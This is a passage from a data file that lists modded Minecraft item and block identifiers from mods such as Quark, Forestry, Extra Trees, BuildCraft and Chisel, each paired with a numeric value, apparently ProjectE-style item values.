  ""cathedral:cathedral_pillar_various|9"": 3,
  ""cathedral:cathedral_pane_stained|0"": 23,
  ""cathedral:cathedral_pane_stained|1"": 23,
  ""forestry:doors.teak|0"": 16,
  ""ic2:leaves|0"": 1,
  ""quark:stained_planks_blue_slab|0"": 4,
  ""minecraft:spruce_stairs|0"": 6,
  ""quark:fire_stone_wall|0"": 64,
  ""minecraft:nether_wart_block|0"": 216,
  ""quark:colored_flowerpot_black|0"": 64,
  ""buildcraftcore:list|0"": 296,
  ""quark:thatch_slab|0"": 48,
  ""extratrees:stairs.locust|0"": 6,
  ""railcraft:bloodstained_paver_stairs|0"": 27,
  ""quark:world_stone_bricks|5"": 1,
  ""quark:acacia_button|0"": 8,
  ""quark:world_stone_bricks|0"": 16,
  ""quark:world_stone_bricks|1"": 16,
  ""quark:world_stone_bricks|2"": 16,
  ""minecraft:chorus_fruit|0"": 192,
  ""quark:bark_jungle_slab|0"": 16,
  ""extratrees:slabs.0|5"": 4,
  ""extratrees:slabs.1|4"": 4,
  ""extratrees:slabs.0|4"": 4,
  ""extratrees:slabs.1|5"": 4,
  ""extratrees:slabs.0|7"": 4,
  ""extratrees:slabs.1|6"": 4,
  ""extratrees:slabs.0|6"": 4,
  ""extratrees:slabs.1|7"": 4,
  ""extratrees:slabs.0|1"": 4,
  ""extratrees:slabs.1|0"": 4,
  ""extratrees:slabs.0|0"": 4,
  ""extratrees:slabs.1|1"": 4,
  ""extratrees:slabs.0|3"": 4,
  ""extratrees:slabs.1|2"": 4,
  ""extratrees:slabs.0|2"": 4,
  ""extratrees:slabs.1|3"": 4,
  ""extratrees:slabs.2|3"": 4,
  ""extratrees:slabs.4|1"": 4,
  ""extratrees:slabs.3|2"": 4,
  ""extratrees:slabs.4|0"": 4,
  ""extratrees:slabs.2|2"": 4,
  ""extratrees:slabs.3|3"": 4,
  ""forestry:doors.ebony|0"": 16,
  ""extratrees:slabs.2|1"": 4,
  ""extratrees:slabs.4|3"": 4,
  ""extratrees:slabs.3|0"": 4,
  ""extratrees:slabs.4|2"": 4,
  ""extratrees:slabs.2|0"": 4,
  ""extratrees:slabs.3|1"": 4,
  ""extratrees:slabs.2|7"": 4,
  ""extratrees:slabs.3|6"": 4,
  ""extratrees:slabs.2|6"": 4,
  ""extratrees:slabs.3|7"": 4,
  ""extratrees:slabs.2|5"": 4,
  ""extratrees:slabs.3|4"": 4,
  ""extratrees:slabs.2|4"": 4,
  ""extratrees:slabs.3|5"": 4,
  ""quark:birch_button|0"": 8,
  ""projectred-exploration:peridot_sword|0"": 2052,
  ""extratrees:fence.gates.rowan|0"": 32,
  ""minecraft:iron_leggings|0"": 1792,
  ""quark:thatch_stairs|0"": 72,
  ""minecraft:golden_hoe|0"": 4104,
  ""projecte:matter_block|1"": 1867776,
  ""projecte:matter_block|0"": 557056,
  ""extratrees:logs.0|0"": 32,
  ""extratrees:logs.1|1"": 32,
  ""extratrees:logs.0|1"": 32,
  ""extratrees:logs.1|0"": 32,
  ""extratrees:logs.0|2"": 32,
  ""extratrees:logs.1|3"": 32,
  ""chisel:brownstone|0"": 8,
  ""extratrees:logs.0|3"": 32,
  ""extratrees:logs.1|2"": 32,
  ""quark:stone_andesite_slab|0"": 8,
  ""extratrees:logs.2|2"": 32,
  ""extratrees:logs.3|3"": 32,
  ""extratrees:logs.4|0"": 32,
  ""extratrees:logs.5|1"": 32,
  ""extratrees:logs.2|3"": 32,
  ""extratrees:logs.3|2"": 32,
  ""extratrees:logs.4|1"": 32,
  ""extratrees:logs.5|0"": 32,
  ""extratrees:logs.2|0"": 32,
  ""extratrees:logs.3|1"": 32,
  ""extratrees:logs.4|2"": 32,
  ""extratrees:logs.5|3"": 32,
  ""ironchest:diamond_obsidian_chest_upgrade|0"": 513,
  ""extratrees:logs.2|1"": 32,
  ""extratrees:logs.3|0"": 32,
  ""extratrees:logs.4|3"": 32,
  ""extratrees:logs.5|2"": 32,
  ""extratrees:logs.6|2"": 32,
  ""extratrees:logs.7|3"": 32,
  ""extratrees:logs.8|0"": 32,
  ""extratrees:logs.9|1"": 32,
  ""forestry:doors.wenge|0"": 16,
  ""extratrees:logs.6|3"": 32,
  ""extratrees:logs.7|2"": 32,
  ""extratrees:logs.8|1"": 32,
  ""extratrees:logs.9|0"": 32,
  ""extratrees:logs.6|0"": 32,
  ""extratrees:logs.7|1"": 32,
  ""extratrees:logs.8|2"": 32,
  ""extratrees:logs.9|3"": 32,
  ""extratrees:logs.6|1"": 32,
  ""extratrees:logs.7|0"": 32,
  ""extratrees:logs.8|3"": 32,
  ""extratrees:logs.9|2"": 32,
  ""microblockcbe:stone_rod|0"": 2,
  ""quark:roots_blue_flower|0"": 24,
  ""quark:stone_diorite_bricks_stairs|0"": 12,
  ""extratrees:doors.hawthorn|0"": 16,
  ""extratrees:doors.butternut|0"": 16,
  ""minecraft:silver_glazed_terracotta|0"": 64,
  ""minecraft:record_mall|0"": 2048,
  ""minecraft:lever|0"": 5,
  ""blockcraftery:editable_trap_door|0"": 16,
  ""quark:acacia_pressure_plate|0"": 16,
  ""minecraft:chest_minecart|0"": 1344,
  ""buildcrafttransport:pipe_gold_power|16"": 576,
  ""minecraft:orange_glazed_terracotta|0"": 64,
  ""extratrees:fence.gates.hickory|0"": 32,
  ""forestry:stairs.cherry|0"": 6,
  ""buildcrafttransport:pipe_gold_power|8"": 576,
  ""buildcrafttransport:pipe_gold_power|9"": 576,
  ""buildcrafttransport:pipe_gold_power|10"": 576,
  ""buildcrafttransport:pipe_gold_power|11"": 576,
  ""buildcrafttransport:pipe_gold_power|12"": 576,
  ""buildcrafttransport:pipe_gold_power|13"": 576,
  ""buildcrafttransport:pipe_gold_power|14"": 576,
  ""buildcrafttransport:pipe_gold_power|15"": 576,
  ""minecraft:coal|0"": 128,
  ""minecraft:coal|1"": 32,
  ""buildcrafttransport:pipe_gold_power|1"": 576,
  ""buildcrafttransport:pipe_gold_power|2"": 576,
  ""buildcrafttransport:pipe_gold_power|3"": 576,
  ""buildcrafttransport:pipe_gold_power|4"": 576,
  ""buildcrafttransport:pipe_gold_power|5"": 576,
  ""buildcrafttransport:pipe_gold_power|6"": 576,
  ""buildcrafttransport:pipe_gold_power|7"": 576,
  ""quark:elder_prismarine_slab|0"": 64,
  ""minecraft:dirt|0"": 1,
  ""minecraft:dirt|1"": 2,
  ""galacticraftcore:basic_block_moon|4"": 2,
  ""minecraft:dirt|2"": 2,
  ""galacticraftcore:basic_block_moon|5"": 2,
  ""galacticraftcore:basic_block_moon|3"": 2,
  ""forestry:fence.gates.wenge|0"": 32,
  ""chiselsandbits:chisel_iron|0"": 260,
  ""minecraft:hardened_clay|0"": 64,
  ""minecraft:red_sandstone_stairs|0"": 3,
  ""minecraft:leaves2|1"": 1,
  ""minecraft:leaves2|0"": 1,
  ""extratrees:stairs.gingko|0"": 6,
  ""minecraft:jungle_boat|0"": 40,
  ""extratrees:stairs.holly|0"": 6,
  ""quark:reed_block_wall|0"": 288,
  ""minecraft:ladder|0"": 9,
  ""forestry:doors.greenheart|0"": 16,
  ""minecraft:lapis_block|0"": 7776,
  ""mocreatures:wyvgrass|0"": 1,
  ""extratrees:stairs.alder|0"": 6,
  ""forestry:doors.citrus|0"": 16,
  ""minecraft:golden_pickaxe|0"": 6152,
  ""forestry:doors.mahoe|0"": 16,
  ""minecraft:hopper_minecart|0"": 2624,
  ""minecraft:cyan_glazed_terracotta|0"": 64,
  ""quark:bark_spruce_stairs|0"": 24,
  ""galacticraftplanets:dense_ice|0"": 2,
  ""forestry:doors.chestnut|0"": 16,
  ""extratrees:stairs.iroko|0"": 6,
  ""extratrees:doors.hickory|0"": 16,
  ""ironchest:silver_gold_chest_upgrade|0"": 8708,
  ""quark:fire_stone_slab|0"": 32,
  ""extratrees:stairs.cedar|0"": 6,
  ""minecraft:record_stal|0"": 2048,
  ""forestry:doors.willow|0"": 16,
  ""chisel:bookshelf_birch|0"": 504,
  ""extratrees:fence.gates.hemlock|0"": 32,
  ""minecraft:egg|0"": 32,
  ""quark:colored_flowerpot_red|0"": 64,
  ""minecraft:gold_ingot|0"": 2048,
  ""minecraft:leather|0"": 64,
  ""quark:duskbound_block_wall|0"": 100,
  ""irontanks:silver_gold_upgrade|0"": 4609,
  ""quark:colored_flowerpot_light_blue|0"": 64,
  ""quark:stained_planks_green_slab|0"": 4,
  ""quark:stained_planks_silver_slab|0"": 4,
  ""quark:elder_prismarine_bricks_stairs|0"": 216,
  ""minecraft:end_crystal|0"": 5895,
  ""minecraft:ender_eye|0"": 1792,
  ""galacticraftcore:space_glass_clear|0"": 103,
  ""extratrees:stairs.hawthorn|0"": 6,
  ""quark:stained_planks_brown_slab|0"": 4,
  ""ironchest:silver_gold_shulker_upgrade|0"": 8708,
  ""mocreatures:wyvwood_fence|0"": 13,
  ""forestry:stairs.pine|0"": 6,
  ""minecraft:light_blue_glazed_terracotta|0"": 64,
  ""quark:stained_clay_tiles_orange_slab|0"": 32,
  ""minecraft:chorus_flower|0"": 96,
  ""minecraft:acacia_fence|0"": 13,
  ""forestry:fence.gates.ebony|0"": 32,
  ""minecraft:chorus_fruit_popped|0"": 192,
  ""minecraft:gunpowder|0"": 192,
  ""forestry:stairs.sequoia|0"": 6,
  ""forestry:logs.0|1"": 32,
  ""forestry:logs.0|0"": 32,
  ""forestry:logs.0|3"": 32,
  ""forestry:logs.0|2"": 32,
  ""forestry:logs.1|2"": 32,
  ""forestry:logs.2|3"": 32,
  ""forestry:logs.3|0"": 32,
  ""forestry:logs.4|1"": 32,
  ""forestry:logs.1|3"": 32,
  ""forestry:logs.2|2"": 32,
  ""forestry:logs.3|1"": 32,
  ""forestry:logs.4|0"": 32,
  ""forestry:logs.1|0"": 32,
  ""forestry:logs.2|1"": 32,
  ""forestry:logs.3|2"": 32,
  ""forestry:logs.4|3"": 32,
  ""forestry:logs.1|1"": 32,
  ""forestry:logs.2|0"": 32,
  ""forestry:logs.3|3"": 32,
  ""forestry:logs.4|2"": 32,
  ""forestry:logs.5|2"": 32,
  ""forestry:logs.6|3"": 32,
  ""forestry:logs.7|0"": 32,
  ""forestry:logs.5|3"": 32,
  ""forestry:logs.6|2"": 32,
  ""forestry:logs.5|0"": 32,
  ""forestry:logs.6|1"": 32,
  ""quark:bark_birch_slab|0"": 16,
  ""forestry:logs.5|1"": 32,
  ""forestry:logs.6|0"": 32,
  ""quark:glass_item_frame|0"": 49,
  ""quark:stained_planks_gray_stairs|0"": 6,
  ""forestry:stairs.padauk|0"": 6,
  ""extratrees:stairs.rosewood|0"": 6,
  ""irontanks:glass_iron_upgrade|0"": 1025,
  ""forestry:doors.zebrawood|0"": 16,
  ""chisel:stonebrick1|0"": 1,
  ""chisel:stonebrick2|3"": 1,
  ""chisel:stonebrick1|1"": 1,
  ""chisel:stonebrick2|2"": 1,
  ""chisel:stonebrick1|2"": 1,
  ""chisel:stonebrick2|1"": 1,
  ""chisel:stonebrick1|3"": 1,
  ""chisel:stonebrick2|0"": 1,
  ""chisel:stonebrick1|4"": 1,
  ""chisel:stonebrick2|7"": 1,
  ""chisel:stonebrick1|5"": 1,
  ""chisel:stonebrick2|6"": 1,
  ""chisel:stonebrick1|6"": 1,
  ""chisel:stonebrick2|5"": 1,
  ""chisel:stonebrick1|7"": 1,
  ""chisel:stonebrick2|4"": 1,
  ""chisel:stonebrick1|8"": 1,
  ""quark:color_slime|4"": 296,
  ""chisel:stonebrick1|9"": 1,
  ""chisel:stonebrick2|9"": 1,
  ""railcraft:sandy_brick_stairs|0"": 25,
  ""chisel:stonebrick2|8"": 1,
  ""quark:color_slime|0"": 304,
  ""quark:color_slime|1"": 1152,
  ""quark:color_slime|2"": 720,
  ""quark:color_slime|3"": 728,
  ""chisel:planks-acacia|14"": 8,
  ""chisel:planks-acacia|12"": 8,
  ""chisel:planks-acacia|13"": 8,
  ""chisel:planks-acacia|10"": 8,
  ""chisel:planks-acacia|11"": 8,
  ""chisel:planks-acacia|8"": 8,
  ""chisel:planks-acacia|9"": 8,
  ""chisel:planks-acacia|6"": 8,
  ""chisel:planks-acacia|7"": 8,
  ""chisel:planks-acacia|4"": 8,
  ""chisel:planks-acacia|5"": 8,
  ""chisel:planks-acacia|2"": 8,
  ""mocreatures:mossy_cobbled_wyvstone_stairs|0"": 1,
  ""chisel:planks-acacia|3"": 8,
  ""irontanks:obsidian_tank|0"": 22812,
  ""chisel:planks-acacia|0"": 8,
  ""chisel:planks-acacia|1"": 8,
  ""quark:paper_lantern|0"": 1736,
  ""quark:paper_lantern|1"": 1768,
  ""projectred-exploration:ruby_shovel|0"": 1032,
  ""minecraft:ender_chest|0"": 2304,
  ""blockcraftery:editable_pressure_plate_all_reinforced|0"": 41,
  ""minecraft:slime|0"": 288,
  ""extratrees:doors.beech|0"": 16,
  ""extratrees:stairs.apple|0"": 6,
  ""quark:icy_stone_wall|0"": 64,
  ""quark:iron_plate_stairs|0"": 66,
  ""quark:sandy_bricks_wall|0"": 65,
  ""minecraft:iron_chestplate|0"": 2048,
  ""minecraft:acacia_boat|0"": 40,
  ""minecraft:concrete|0"": 8,
  ""minecraft:concrete|1"": 4,
  ""minecraft:concrete|2"": 4,
  ""minecraft:concrete|3"": 4,
  ""minecraft:concrete|4"": 4,
  ""minecraft:nether_brick_fence|0"": 4,
  ""minecraft:concrete|5"": 6,
  ""minecraft:concrete|6"": 4,
  ""minecraft:concrete|7"": 6,
  ""minecraft:concrete|8"": 4,
  ""minecraft:concrete|9"": 57,
  ""minecraft:concrete|10"": 57,
  ""minecraft:concrete|11"": 110,
  ""minecraft:concrete|12"": 18,
  ""minecraft:concrete|13"": 3,
  ""minecraft:concrete|14"": 4,
  ""minecraft:concrete|15"": 4,
  ""galacticraftcore:cheese_curd|0"": 32,
  ""quark:stained_clay_tiles_silver_stairs|0"": 48,
  ""projectred-exploration:ruby_pickaxe|0"": 3080,
  ""minecraft:snow|0"": 1,
  ""extratrees:fence.gates.yew|0"": 32,
  ""forestry:sapling_ge|0"": 32,
  ""quark:stained_clay_tiles_brown_stairs|0"": 48,
  ""quark:midori_block_slab|0"": 4,
  ""chisel:glassdyedpurple|5"": 1,
  ""chisel:glassdyedpurple|4"": 1,
  ""extratrees:doors.fir|0"": 16,
  ""microblockcbe:saw_diamond|0"": 8206,
  ""chisel:glassdyedpurple|1"": 1,
  ""chisel:glassdyedpurple|0"": 1,
  ""minecraft:wooden_axe|0"": 32,
  ""chisel:glassdyedpurple|3"": 1,
  ""minecraft:activator_rail|0"": 268,
  ""chisel:glassdyedpurple|2"": 1,
  ""minecraft:dark_oak_boat|0"": 40,
  ""extratrees:doors.fig|0"": 16,
  ""railcraft:badlands|4"": 58,
  ""irontanks:copper_tank|0"": 268,
  ""railcraft:badlands|5"": 34,
  ""railcraft:badlands|2"": 34,
  ""railcraft:badlands|3"": 34,
  ""railcraft:badlands|0"": 34,
  ""railcraft:badlands|1"": 34,
  ""quark:elder_prismarine_bricks_slab|0"": 144,
  ""minecraft:baked_potato|0"": 64,
  ""binniecore:field_kit|63"": 560,
  ""chiselsandbits:bitsaw_diamond|0"": 16400,
  ""quark:colored_flowerpot_purple|0"": 488,
  ""minecraft:stone_hoe|0"": 10,
  ""minecraft:bread|0"": 72,
  ""quark:iron_plate_slab|0"": 44,
  ""minecraft:carrot|0"": 64,
  ""forestry:fence.gates.greenheart|0"": 32,
  ""railcraft:frostbound_slab|1"": 56,
  ""extratrees:stairs.elder|0"": 6,
  ""railcraft:frostbound_slab|0"": 56,
  ""chisel:glassdyedgray|1"": 1,
  ""chisel:glassdyedgray|0"": 1,
  ""chisel:glassdyedgray|3"": 1,
  ""chisel:glassdyedgray|2"": 1,
  ""minecraft:diamond_horse_armor|0"": 49200,
  ""buildcrafttransport:pipe_quartz_item|16"": 256,
  ""chisel:glassdyedgray|5"": 1,
  ""chisel:glassdyedgray|4"": 1,
  ""minecraft:cobblestone|0"": 1,
  ""buildcrafttransport:pipe_quartz_item|3"": 256,
  ""ironchest:copper_iron_chest_upgrade|0"": 1156,
  ""buildcrafttransport:pipe_quartz_item|2"": 256,
  ""buildcrafttransport:pipe_quartz_item|1"": 256,
  ""buildcrafttransport:pipe_quartz_item|7"": 256,
  ""buildcrafttransport:pipe_quartz_item|6"": 256,
  ""buildcrafttransport:pipe_quartz_item|5"": 256,
  ""quark:stained_clay_tiles_cyan_slab|0"": 32,
  ""buildcrafttransport:pipe_quartz_item|4"": 256,
  ""buildcrafttransport:pipe_quartz_item|11"": 256,
  ""buildcrafttransport:pipe_quartz_item|10"": 256,
  ""buildcrafttransport:pipe_quartz_item|9"": 256,
  ""buildcrafttransport:pipe_quartz_item|8"": 256,
  ""buildcrafttransport:pipe_quartz_item|15"": 256,
  ""buildcrafttransport:pipe_quartz_item|14"": 256,
  ""buildcrafttransport:pipe_quartz_item|13"": 256,
  ""buildcrafttransport:pipe_quartz_item|12"": 256,
  ""forestry:stairs.chestnut|0"": 6,
  ""botany:trowel_iron|0"": 261,
  ""quark:bark_acacia_wall|0"": 32,
  ""quark:reed_block_stairs|0"": 216,
  ""forestry:stairs.palm|0"": 6,
  ""galacticraftplanets:mars_stairs_cobblestone|0"": 3,
  ""minecraft:acacia_fence_gate|0"": 32,
  ""quark:fire_stone_brick_stairs|0"": 48,
  ""cathedral:cathedral_gargoyle_demon_marble|0"": 265,
  ""extratrees:stairs.elm|0"": 6,
  ""forestry:fence.gates.chestnut|0"": 32,
  ""mocreatures:fine_silver_ingot|0"": 512,
  ""mocreatures:cobbled_deep_wyvstone_wall|0"": 1,
  ""minecraft:stone|1"": 16,
  ""minecraft:stone|0"": 1,
  ""minecraft:stone|3"": 16,
  ""minecraft:stone|2"": 16,
  ""minecraft:stone|5"": 16,
  ""minecraft:stone|4"": 16,
  ""minecraft:stone|6"": 16,
  ""extratrees:stairs.olive|0"": 6,
  ""minecraft:leather_leggings|0"": 448,
  ""quark:bark_birch_stairs|0"": 24,
  ""quark:cobblestone_mossy_slab|0"": 4,
  ""minecraft:sea_lantern|0"": 3584,
  ""minecraft:ghast_tear|0"": 4096,
  ""extratrees:fence.gates.rosewood|0"": 32,
  ""chisel:valentines|0"": 6,
  ""quark:biome_cobblestone|1"": 64,
  ""quark:biome_cobblestone|0"": 64,
  ""quark:biome_cobblestone|2"": 16,
  ""minecraft:crafting_table|0"": 32,
  ""quark:colored_flowerpot_blue|0"": 912,
  ""minecraft:blaze_powder|0"": 768,
  ""blockcraftery:editable_door|0"": 16,
  ""forestry:fence.gates.palm|0"": 32,
  ""forestry:fence.gates.papaya|0"": 32,
  ""quark:stained_clay_tiles_brown_slab|0"": 32,
  ""forestry:stairs.greenheart|0"": 6,
  ""blockcraftery:editable_pressure_plate_mobs_reinforced|0"": 41,
  ""mocreatures:deep_wyvstone_button|0"": 2,
  ""mocreatures:wyvwood_leaves|0"": 1,
  ""forestry:doors.maple|0"": 16,
  ""blockcraftery:editable_pressure_plate_all|0"": 16,
  ""quark:stained_planks_lime_stairs|0"": 6,
  ""minecraft:magma_cream|0"": 800,
  ""forestry:doors.poplar|0"": 16,
  ""quark:grate|0"": 192,
  ""quark:stone_diorite_stairs|0"": 12,
  ""buildcrafttransport:pipe_gold_item|16"": 512,
  ""chisel:glassdyedgreen|2"": 1,
  ""buildcrafttransport:pipe_gold_item|13"": 512,
  ""chisel:glassdyedgreen|3"": 1,
  ""buildcrafttransport:pipe_gold_item|12"": 512,
  ""chisel:glassdyedgreen|0"": 1,
  ""buildcrafttransport:pipe_gold_item|15"": 512,
  ""chisel:glassdyedgreen|1"": 1,
  ""buildcrafttransport:pipe_gold_item|14"": 512,
  ""buildcrafttransport:pipe_gold_item|9"": 512,
  ""buildcrafttransport:pipe_gold_item|8"": 512,
  ""chisel:glassdyedgreen|4"": 1,
  ""buildcrafttransport:pipe_gold_item|11"": 512,
  ""chisel:glassdyedgreen|5"": 1,
  ""buildcrafttransport:pipe_gold_item|10"": 512,
  ""buildcrafttransport:pipe_gold_item|5"": 512,
  ""buildcrafttransport:pipe_gold_item|4"": 512,
  ""buildcrafttransport:pipe_gold_item|7"": 512,
  ""buildcrafttransport:pipe_gold_item|6"": 512,
  ""minecraft:leaves|0"": 1,
  ""buildcrafttransport:pipe_gold_item|1"": 512,
  ""minecraft:leaves|1"": 1,
  ""minecraft:leaves|2"": 1,
  ""buildcrafttransport:pipe_gold_item|3"": 512,
  ""minecraft:leaves|3"": 1,
  ""buildcrafttransport:pipe_gold_item|2"": 512,
  ""minecraft:prismarine_crystals|0"": 512,
  ""chisel:glassdyedblack|5"": 1,
  ""chisel:glassdyedblack|4"": 1,
  ""chisel:glassdyedblack|3"": 1,
  ""chisel:glassdyedblack|2"": 1,
  ""chisel:glassdyedblack|1"": 1,
  ""chisel:glassdyedblack|0"": 1,
  ""minecraft:furnace|0"": 8,
  ""forestry:stairs.teak|0"": 6,
  ""quark:bark_oak_wall|0"": 32,
  ""chisel:chisel_diamond|0"": 8196,
  ""minecraft:jungle_stairs|0"": 6,
  ""minecraft:rail|0"": 96,
  ""quark:stone_diorite_slab|0"": 8,
  ""minecraft:purple_shulker_box|0"": 4160,
  ""railcraft:generic|8"": 32,
  ""forestry:fence.gates.pine|0"": 32,
  ""quark:stained_clay_tiles_pink_slab|0"": 32,
  ""quark:spruce_button|0"": 8,
  ""chisel:glass1|1"": 1,
  ""chisel:glass1|0"": 1,
  ""railcraft:abyssal_paver_stairs|0"": 24,
  ""quark:roots|0"": 8,
  ""minecraft:web|0"": 12,
  ""quark:bark_jungle_wall|0"": 32,
  ""railcraft:frostbound_paver_stairs|0"": 84,
  ""minecraft:painting|0"": 80,
  ""quark:bark|3"": 32,
  ""quark:bark|2"": 32,
  ""quark:bark|1"": 32,
  ""quark:bark|0"": 32,
  ""quark:stained_clay_tiles_lime_slab|0"": 32,
  ""quark:bark|5"": 32,
  ""ironchest:copper_silver_shulker_upgrade|0"": 4224,
  ""quark:bark|4"": 32,
  ""minecraft:dispenser|0"": 119,
  ""buildcrafttransport:pipe_stone_power|8"": 64,
  ""buildcrafttransport:pipe_stone_power|9"": 64,
  ""buildcrafttransport:pipe_stone_power|10"": 64,
  ""buildcrafttransport:pipe_stone_power|11"": 64,
  ""buildcrafttransport:pipe_stone_power|12"": 64,
  ""buildcrafttransport:pipe_stone_power|13"": 64,
  ""minecraft:leather_boots|0"": 256,
  ""buildcrafttransport:pipe_stone_power|14"": 64,
  ""buildcrafttransport:pipe_stone_power|15"": 64,
  ""buildcrafttransport:pipe_stone_power|1"": 64,
  ""minecraft:beetroot_soup|0"": 390,
  ""buildcrafttransport:pipe_stone_power|2"": 64,
  ""ironchest:iron_gold_chest_upgrade|0"": 16640,
  ""buildcrafttransport:pipe_stone_power|3"": 64,
  ""buildcrafttransport:pipe_stone_power|4"": 64,
  ""buildcrafttransport:pipe_stone_power|5"": 64,
  ""buildcrafttransport:pipe_stone_power|6"": 64,
  ""buildcrafttransport:pipe_stone_power|7"": 64,
  ""minecraft:redstone_block|0"": 576,
  ""buildcrafttransport:pipe_stone_power|16"": 64,
  ""railcraft:badlands_brick_stairs|0"": 25,
  ""forestry:fence.gates.teak|0"": 32,
  ""quark:thatch|0"": 96,
  ""minecraft:sponge|1"": 128,
  ""minecraft:sponge|0"": 128,
  ""extratrees:stairs.hemlock|0"": 6,
  ""quark:stained_clay_tiles_orange_stairs|0"": 48,
  ""quark:stained_planks_magenta_stairs|0"": 6,
  ""minecraft:fermented_spider_eye|0"": 192,
  ""extratrees:stairs.logwood|0"": 6,
  ""extratrees:doors.brazilwood|0"": 16,
  ""irontanks:glass_copper_upgrade|0"": 513,
  ""minecraft:rabbit_hide|0"": 16,
  ""mocreatures:cobbled_wyvstone|0"": 1,
  ""quark:stone_granite_wall|0"": 16,
  ""forestry:stairs.poplar|0"": 6,
  ""quark:stained_clay_tiles_red_stairs|0"": 48,
  ""quark:charred_nether_brick_stairs|0"": 85,
  ""buildcrafttransport:pipe_cobble_power|16"": 64,
  ""quark:stained_planks_blue_stairs|0"": 6,
  ""buildcrafttransport:pipe_cobble_power|2"": 64,
  ""buildcrafttransport:pipe_cobble_power|3"": 64,
  ""buildcrafttransport:pipe_cobble_power|1"": 64,
  ""buildcrafttransport:pipe_cobble_power|6"": 64,
  ""buildcrafttransport:pipe_cobble_power|7"": 64,
  ""buildcrafttransport:pipe_cobble_power|4"": 64,
  ""buildcrafttransport:pipe_cobble_power|5"": 64,
  ""buildcrafttransport:pipe_cobble_power|10"": 64,
  ""buildcrafttransport:pipe_cobble_power|11"": 64,
  ""buildcrafttransport:pipe_cobble_power|8"": 64,
  ""buildcrafttransport:pipe_cobble_power|9"": 64,
  ""buildcrafttransport:pipe_cobble_power|14"": 64,
  ""buildcrafttransport:pipe_cobble_power|15"": 64,
  ""buildcrafttransport:pipe_cobble_power|12"": 64,
  ""buildcrafttransport:pipe_cobble_power|13"": 64,
  ""minecraft:carrot_on_a_stick|0"": 100,
  ""minecraft:wheat|0"": 24,
  ""quark:stained_clay_tiles_yellow_stairs|0"": 48,
  ""quark:bark_dark_oak_slab|0"": 16,
  ""blockcraftery:editable_stairs_reinforced|0"": 24,
  ""galacticraftplanets:venus|0"": 8,
  ""galacticraftplanets:venus|1"": 8,
  ""galacticraftplanets:venus|2"": 64,
  ""galacticraftplanets:venus|3"": 16,
  ""minecraft:brown_glazed_terracotta|0"": 64,
  ""extratrees:doors.sweetgum|0"": 16,
  ""quark:cobbed_stone_stairs|0"": 12,
  ""minecraft:acacia_stairs|0"": 6,
  ""ironchest:diamond_obsidian_shulker_upgrade|0"": 513,
  ""quark:stone_granite_bricks_wall|0"": 16,
  ""minecraft:glass_bottle|0"": 1,
  ""railcraft:bleachedbone_paver_stairs|0"": 162,
  ""cathedral:claytile|0"": 3,
  ""extratrees:fence.gates.whitebeam|0"": 32,
  ""minecraft:diamond_shovel|0"": 8200,
  ""quark:elder_prismarine_dark_wall|0"": 1040,
  ""mocreatures:wyvdirt|0"": 1,
  ""minecraft:magenta_glazed_terracotta|0"": 64,
  ""minecraft:stone_button|0"": 1,
  ""minecraft:birch_boat|0"": 40,
  ""chisel:glassdyedorange|4"": 1,
  ""chisel:glassdyedorange|5"": 1,
  ""chisel:glassdyedorange|0"": 1,
  ""chisel:glassdyedorange|1"": 1,
  ""chisel:glassdyedorange|2"": 1,
  ""chisel:glassdyedorange|3"": 1,
  ""minecraft:detector_rail|0"": 267,
  ""quark:cobbed_stone_slab|0"": 8,
  ""minecraft:pink_glazed_terracotta|0"": 64,
  ""minecraft:hopper|0"": 1344,
  ""quark:sandy_bricks|0"": 65,
  ""minecraft:green_glazed_terracotta|0"": 64,
  ""quark:stained_clay_tiles_blue_slab|0"": 32,
  ""minecraft:chorus_plant|0"": 64,
  ""minecraft:flint_and_steel|0"": 260,
  ""quark:soul_sandstone_bricks_stairs|0"": 147,
  ""minecraft:glowstone_dust|0"": 384,
  ""projecte:nova_cataclysm|0"": 4849,
  ""mocreatures:wyvwood_fence_gate|0"": 32,
  ""buildcrafttransport:pipe_void_item|16"": 10,
  ""buildcrafttransport:pipe_void_item|8"": 10,
  ""buildcrafttransport:pipe_void_item|9"": 10,
  ""buildcrafttransport:pipe_void_item|10"": 10,
  ""buildcrafttransport:pipe_void_item|11"": 10,
  ""buildcrafttransport:pipe_void_item|12"": 10,
  ""buildcrafttransport:pipe_void_item|13"": 10,
  ""buildcrafttransport:pipe_void_item|14"": 10,
  ""buildcrafttransport:pipe_void_item|15"": 10,
  ""buildcrafttransport:pipe_void_item|1"": 10,
  ""buildcrafttransport:pipe_void_item|2"": 10,
  ""buildcrafttransport:pipe_void_item|3"": 10,
  ""buildcrafttransport:pipe_void_item|4"": 10,
  ""buildcrafttransport:pipe_void_item|5"": 10,
  ""buildcrafttransport:pipe_void_item|6"": 10,
  ""buildcrafttransport:pipe_void_item|7"": 10,
  ""quark:colored_flowerpot_orange|0"": 64,
  ""minecraft:lime_glazed_terracotta|0"": 64,
  ""quark:tallow|0"": 64,
  ""projectred-exploration:ruby_sickle|0"": 3076,
  ""mocreatures:mossy_cobbled_deep_wyvstone_slab|0"": 1,
  ""extratrees:fence.gates.pinkivory|0"": 32,
  ""ironchest:wood_iron_chest_upgrade|0"": 2056,
  ""quark:stained_planks_purple_slab|0"": 4,
  ""minecraft:clock|0"": 8256,
  ""quark:stained_planks_pink_stairs|0"": 6,
  ""blockcraftery:editable_slab_reinforced|0"": 33,
  ""railcraft:badlands_slab|1"": 17,
  ""railcraft:badlands_slab|0"": 17,
  ""forestry:fence.gates.giganteum|0"": 32,
  ""blockcraftery:editable_fence|0"": 6,
  ""quark:crab_leg|0"": 64,
  ""minecraft:golden_helmet|0"": 10240,
  ""minecraft:spectral_arrow|0"": 775,
  ""quark:iron_rod|0"": 944,
  ""forestry:stairs.ebony|0"": 6,
  ""minecraft:emerald_block|0"": 147456,
  ""chisel:bookshelf_jungle|0"": 504,
  ""railcraft:sandy|4"": 58,
  ""railcraft:sandy|5"": 34,
  ""quark:colored_flowerpot_cyan|0"": 484,
  ""railcraft:sandy|2"": 34,
  ""quark:bark_spruce_slab|0"": 16,
  ""railcraft:sandy|3"": 34,
  ""railcraft:sandy|0"": 34,
  ""railcraft:sandy|1"": 34,
  ""quark:variant_sapling|1"": 32,
  ""quark:variant_sapling|0"": 32,
  ""railcraft:bleachedbone_slab|0"": 108,
  ""railcraft:bleachedbone_slab|1"": 108,
  ""quark:stone_diorite_bricks_wall|0"": 16,
  ""extratrees:fence.gates.beech|0"": 32,
  ""railcraft:bloodstained|5"": 36,
  ""railcraft:bloodstained|4"": 60,
  ""railcraft:bloodstained|3"": 36,
  ""railcraft:bloodstained|2"": 36,
  ""railcraft:bloodstained|1"": 36,
